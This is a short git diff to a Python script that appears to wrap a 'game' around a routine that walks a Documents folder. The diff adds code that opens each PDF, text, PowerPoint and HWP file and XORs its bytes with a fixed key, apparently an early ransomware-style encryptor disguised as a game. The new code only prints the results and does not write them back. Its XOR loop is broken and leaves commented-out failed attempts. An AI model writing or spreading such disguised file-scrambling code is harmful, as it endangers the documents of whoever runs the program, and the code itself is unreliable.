@@ -19,7 +19,7 @@ def game():
 		print("ERROR : Click\n")
 		return 0
 
-def search(dirname):
+def search(dirname,key):
 	filekinds = ['.pdf','.txt','.ppt','hwp']
 	filenames = os.listdir(dirname)
 	try:
@@ -30,7 +30,19 @@ def search(dirname):
 			else :
 				ext = os.path.splitext(full_filename)[-1]
 				if ext in filekinds : 
-					print(full_filename)
+					f = open(full_filename,'rb')
+					while True:
+						data = f.read(32)
+						for i in data:
+ 							output = int(i) ^ int(key)
+
+						#key=bytes(key)
+						#print(type(key))
+						#output = int(data.decode())^int(key.decode())
+						print(output)
+						if not data:
+							break
+
 	except PermissionError:
 		print("ERROR : Permission\n")
 
@@ -38,5 +50,5 @@ if __name__ == '__main__':
 	print("Score : %d\n"%score)
 	while score<30:
 		if game() == 1:
-			search("Y:\Documents\\test\\")
+			search("Y:\Documents\\test\\",31337)
 
